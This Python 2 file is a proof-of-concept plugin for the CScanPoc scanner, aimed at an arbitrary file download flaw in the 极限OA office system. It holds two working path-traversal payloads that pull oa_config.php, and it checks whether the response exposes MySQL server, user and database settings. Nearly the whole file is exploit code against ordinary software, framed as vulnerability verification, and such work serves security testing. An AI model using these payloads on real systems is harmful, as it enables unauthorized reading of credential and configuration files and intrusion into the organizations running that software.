# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = '9d8fa280-639e-4459-ba9a-219d62e8d396'
    name = '极限OA 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2015-07-16'  # 漏洞公布时间
    desc = '''
        极限OA 任意文件下载。
        /general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php
        /module/AIP/get_file.php?MODULE=/&ATTACHMENT_ID=.._webroot/inc/oa_config&ATTACHMENT_NAME=php
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '极限OA系统'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '09bd251d-f6c8-4d79-940e-a6be0075693a'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #__Refer___ = http://wooyun.org/bugs/wooyun-2010-0126661
            hh = hackhttp.hackhttp()
            payload1 = '/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php'
            payload2 = '/module/AIP/get_file.php?MODULE=/&ATTACHMENT_ID=.._webroot/inc/oa_config&ATTACHMENT_NAME=php'

            url1 = self.target + payload1
            code1, head, body1, errcode, _url = hh.http(url1)
            if code1 == 200 and '$MYSQL_SERVER' in body1 and '$MYSQL_USER' in body1 and '$MYSQL_DB' in body1:
                #security_hole(url1 + 'Arbitrary File Download')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))


            url2 = self.target + payload2
            code2, head, body2, errcode, _url = hh.http(url2)
            if code2 == 200 and '$MYOA_SESS_SAVE_HANDLER' in body2:
                #security_hole(url1 + '\nArbitrary File read')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
